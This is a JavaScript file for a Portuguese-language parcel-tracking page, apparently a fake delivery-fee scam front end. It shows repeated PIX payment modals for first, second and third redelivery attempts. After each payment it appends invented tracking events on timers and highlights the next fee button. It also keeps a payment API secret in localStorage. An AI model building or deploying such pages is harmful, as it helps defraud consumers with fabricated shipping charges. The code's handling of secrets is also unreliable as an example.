            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            console.log('⚠️ Usando PIX estático como fallback para reenvio');
        }

        modal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Taxa de Reenvio - ${attemptNumber}ª Tentativa</h2>
                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}ª Tentativa</span>
                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
                        </div>
                    </div>

                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div style="text-align: center; margin-top: 20px;">
                            <button id="simulateDeliveryPaymentButton" class="liberation-button-timeline" data-step-id="${stepId}" data-attempt="${attemptNumber}">
                                <i class="fas fa-credit-card"></i> Simular Pagamento
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';

        this.setupDeliveryPaymentModalEvents(modal, stepId, attemptNumber);

        console.log(`💳 Modal de pagamento para ${attemptNumber}ª tentativa exibido - R$ ${value.toFixed(2)}`);
    }

    setupDeliveryPaymentModalEvents(modal, stepId, attemptNumber) {
        // Botão fechar
        const closeButton = modal.querySelector('#closeDeliveryPaymentModal');
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeDeliveryPaymentModal();
            });
        }

        // Botão copiar PIX
        const copyButton = modal.querySelector('#copyDeliveryPixButton');
        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyDeliveryPixCode();
            });
        }

        // Botão simular pagamento
        const simulateButton = modal.querySelector('#simulateDeliveryPaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulateDeliveryPayment(stepId, attemptNumber);
            });
        }

        // Fechar ao clicar fora
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeDeliveryPaymentModal();
            }
        });
    }

    copyDeliveryPixCode() {
        const pixInput = document.getElementById('deliveryPixCode');
        const copyButton = document.getElementById('copyDeliveryPixButton');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX de reenvio copiado:', pixInput.value.substring(0, 50) + '...');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX de reenvio:', error);
            this.showError('Erro ao copiar código PIX. Tente selecionar e copiar manualmente.');
        }
    }

    simulateDeliveryPayment(stepId, attemptNumber) {
        console.log(`💳 Simulando pagamento para ${attemptNumber}ª tentativa de entrega...`);
        
        this.closeDeliveryPaymentModal();
        this.hideDeliveryButton(stepId);
        this.showDeliveryPaymentSuccess(attemptNumber);
        
        setTimeout(() => {
            this.addPostDeliveryPaymentSteps(stepId, attemptNumber);
        }, 1000);
    }

    hideDeliveryButton(stepId) {
        const deliveryButton = document.querySelector(`[data-step-id="${stepId}"]`);
        if (deliveryButton) {
            deliveryButton.style.display = 'none';
            console.log(`✅ Botão de reenvio da etapa ${stepId} ocultado`);
        }
    }

    showDeliveryPaymentSuccess(attemptNumber) {
        const notification = document.createElement('div');
        notification.className = 'payment-success-notification';
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;

        notification.innerHTML = `
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${attemptNumber}ª tentativa de reenvio autorizada.</div>
            </div>
        `;

        document.body.appendChild(notification);

        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    addPostDeliveryPaymentSteps(stepId, attemptNumber) {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const stageNames = this.getStageNames();
        
        // Definir próximas etapas baseadas na tentativa
        let nextSteps = [];
        if (attemptNumber === 1) {
            nextSteps = [17, 18, 19]; // Após 1ª tentativa
        } else if (attemptNumber === 2) {
            nextSteps = [21, 22, 23]; // Após 2ª tentativa
        } else if (attemptNumber === 3) {
            nextSteps = [25, 26]; // Após 3ª tentativa
        }

        const delays = [0, 2 * 60 * 1000, 2 * 60 * 60 * 1000]; // 0, 2min, 2h

        nextSteps.forEach((nextStepId, index) => {
            const delay = delays[index] || 0;
            
            setTimeout(() => {
                const stepDate = new Date();
                const timelineItem = this.createTimelineItem({
                    id: nextStepId,
                    date: stepDate,
                    title: stageNames[nextStepId],
                    description: stageNames[nextStepId],
                    isChina: false,
                    completed: true,
                    needsLiberation: false,
                    needsDeliveryPayment: nextStepId === 20 || nextStepId === 24,
                    deliveryAttempt: nextStepId === 20 ? 2 : nextStepId === 24 ? 3 : null
                }, index === nextSteps.length - 1);

                timeline.appendChild(timelineItem);

                setTimeout(() => {
                    timelineItem.style.opacity = '1';
                    timelineItem.style.transform = 'translateY(0)';
                }, 100);

                timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });

                // Destacar próximo botão de reenvio se houver
                if ((nextStepId === 20 || nextStepId === 24)) {
                    setTimeout(() => {
                        this.highlightDeliveryButton(nextStepId);
                    }, 1000);
                }

            }, delay);
        });
    }

    highlightDeliveryButton(stepId) {
        const deliveryButton = document.querySelector(`[data-step-id="${stepId}"]`);
        if (deliveryButton) {
            this.scrollToElement(deliveryButton, window.innerHeight / 2);
            
            setTimeout(() => {
                deliveryButton.style.animation = 'pulse 2s infinite, glow 2s ease-in-out';
                deliveryButton.style.boxShadow = '0 0 20px rgba(30, 74, 107, 0.8)';
                
                setTimeout(() => {
                    deliveryButton.style.animation = 'pulse 2s infinite';
                    deliveryButton.style.boxShadow = '0 4px 15px rgba(30, 74, 107, 0.4)';
                }, 6000);
            }, 500);
        }
    }

    closeDeliveryPaymentModal() {
        const modal = document.getElementById('deliveryPaymentModal');
        if (modal) {
            modal.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (modal.parentNode) {
                    modal.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    guideToCopyButton() {
        const copyButton = document.getElementById('copyPixButtonModal');
        const pixSection = document.querySelector('.pix-copy-section');
        
        if (!copyButton || !pixSection) return;

        pixSection.style.position = 'relative';

        const guideIndicator = document.createElement('div');
        guideIndicator.className = 'copy-guide-indicator';
        guideIndicator.innerHTML = '👆 Copie o código PIX aqui';
        guideIndicator.style.cssText = `
            position: absolute;
            top: -35px;
            right: 0;
            background: #ff6b35;
            color: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
            z-index: 10;
            white-space: nowrap;
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
        `;

        pixSection.appendChild(guideIndicator);
        pixSection.style.animation = 'highlightSection 3s ease';

        setTimeout(() => {
            pixSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 200);

        setTimeout(() => {
            if (guideIndicator.parentNode) {
                guideIndicator.remove();
            }
            pixSection.style.animation = '';
        }, 6000);
    }

    copyPixCode() {
        const pixInput = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        const copyManualButton = document.getElementById('copyPixManualButton');
        
        if (!pixInput) return;
        
        try {
            // Selecionar texto
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);
            
            // Tentar copiar usando Clipboard API
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX copiado via Clipboard API');
                    this.showCopySuccess(copyButton || copyManualButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton || copyManualButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton || copyManualButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }
    
    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand');
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }
    
    showCopySuccess(button) {
        if (!button) return;
        
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    closeModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    toggleAccordion() {
        const content = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');
        
        if (!content || !toggleIcon) return;

        if (content.classList.contains('expanded')) {
            content.classList.remove('expanded');
            toggleIcon.classList.remove('rotated');
        } else {
            content.classList.add('expanded');
            toggleIcon.classList.add('rotated');
        }
    }

    copyPixCode(inputId, buttonId) {
        const input = document.getElementById(inputId);
        const button = document.getElementById(buttonId);
        
        if (!input || !button) return;

        try {
            input.select();
            input.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(input.value).then(() => {
                    console.log('✅ PIX copiado via Clipboard API:', input.value.substring(0, 50) + '...');
                    this.showCopySuccess(button);
                }).catch(() => {
                    this.fallbackCopy(input, button);
                });
            } else {
                this.fallbackCopy(input, button);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
            this.showError('Erro ao copiar código PIX. Tente selecionar e copiar manualmente.');
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand:', input.value.substring(0, 50) + '...');
                this.showCopySuccess(button);
            } else {
                throw new Error('execCommand falhou');
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
            this.showError('Erro ao copiar. Selecione o texto e use Ctrl+C.');
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    handleAutoFocus() {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('focus') === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    const trackingHero = document.querySelector('.tracking-hero');
                    if (trackingHero) {
                        this.scrollToElement(trackingHero, 0);
                    }
                    
                    setTimeout(() => {
                        cpfInput.focus();
                        
                        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                            cpfInput.setAttribute('inputmode', 'numeric');
                            cpfInput.setAttribute('pattern', '[0-9]*');
                            cpfInput.click();
                        }
                    }, 800);
                }
            }, 100);

            // Limpar parâmetro da URL
            const cleanUrl = window.location.pathname;
            window.history.replaceState({}, document.title, cleanUrl);
        }
    }

    clearOldData() {
        try {
            const keys = Object.keys(localStorage);
            keys.forEach(key => {
                if (key.startsWith('tracking_')) {
                    localStorage.removeItem(key);
                }
            });
        } catch (error) {
            console.error('Erro ao limpar dados antigos:', error);
        }
    }

    saveTrackingData() {
        if (!this.currentCPF || !this.trackingData) return;

        try {
            localStorage.setItem(`tracking_${this.currentCPF}`, JSON.stringify(this.trackingData));
        } catch (error) {
            console.error('Erro ao salvar dados:', error);
        }
    }

    getFirstAndLastName(fullName) {
        const names = fullName.trim().split(' ');
        console.log('🔍 Processando nome completo:', fullName);
        console.log('🔍 Nomes separados:', names);
        
        if (names.length === 1) {
            console.log('✅ Nome único encontrado:', names[0]);
            return names[0];
        }
        
        const result = `${names[0]} ${names[names.length - 1]}`;
        console.log('✅ Nome processado:', result);
        return result;
    }

    updateElement(id, text) {
        console.log(`🔄 Tentando atualizar elemento '${id}' com texto:`, text);
        const element = document.getElementById(id);
        if (element) {
            const oldText = element.textContent;
            element.textContent = text;
            console.log(`✅ Elemento '${id}' atualizado:`);
            console.log(`   Texto anterior: "${oldText}"`);
            console.log(`   Texto novo: "${text}"`);
        } else {
            console.error(`❌ Elemento '${id}' não encontrado no DOM`);
            console.log('🔍 Elementos disponíveis:', Array.from(document.querySelectorAll('[id]')).map(el => el.id));
        }
    }

    showElement(id) {
        const element = document.getElementById(id);
        if (element) {
            element.style.display = 'block';
        }
    }

    showLoadingNotification() {
        const notificationOverlay = document.createElement('div');
        notificationOverlay.id = 'trackingNotification';
        notificationOverlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const notificationContent = document.createElement('div');
        notificationContent.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `;

        notificationContent.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `;

        notificationOverlay.appendChild(notificationContent);
        document.body.appendChild(notificationOverlay);
        document.body.style.overflow = 'hidden';

        // Adicionar animações CSS se não existirem
        if (!document.getElementById('trackingAnimations')) {
            const style = document.createElement('style');
            style.id = 'trackingAnimations';
            style.textContent = `
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                @keyframes slideUp {
                    from { opacity: 0; transform: translateY(50px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }
    }

    closeLoadingNotification() {
        const notification = document.getElementById('trackingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    showError(message) {
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }

        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `;
        errorDiv.textContent = message;

        const form = document.querySelector('.tracking-form');
        if (form) {
            form.appendChild(errorDiv);

            setTimeout(() => {
                if (errorDiv.parentNode) {
                    errorDiv.style.animation = 'slideUp 0.3s ease';
                    setTimeout(() => errorDiv.remove(), 300);
                }
            }, 5000);
        }
    }

    scrollToElement(element, offset = 0) {
        if (!element) return;

        const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
        const offsetPosition = elementPosition - offset;

        window.scrollTo({
            top: offsetPosition,
            behavior: 'smooth'
        });
    }

    animateTimeline() {
        const timelineItems = document.querySelectorAll('.timeline-item');
        timelineItems.forEach((item, index) => {
            setTimeout(() => {
                item.style.opacity = '1';
                item.style.transform = 'translateY(0)';
            }, index * 100);
        });
    }

    // Método para configurar API secret externamente
    setZentraPayApiSecret(apiSecret) {
        const success = this.zentraPayService.setApiSecret(apiSecret);
        if (success) {
            console.log('✅ API Secret Zentra Pay configurada com sucesso');
        } else {
            console.error('❌ Falha ao configurar API Secret Zentra Pay');
        }
        return success;
    }
}

// Função global para configurar API secret
window.setZentraPayApiSecret = function(apiSecret) {
    if (window.trackingSystemInstance) {
        return window.trackingSystemInstance.setZentraPayApiSecret(apiSecret);
    } else {
        // Armazenar para uso posterior
        window.ZENTRA_PAY_SECRET_KEY = apiSecret;
        localStorage.setItem('zentra_pay_secret_key', apiSecret);
        console.log('🔑 API Secret armazenada para uso posterior');
        return true;
    }
};

// Configurar valor padrão
window.valor_em_reais = 26.34;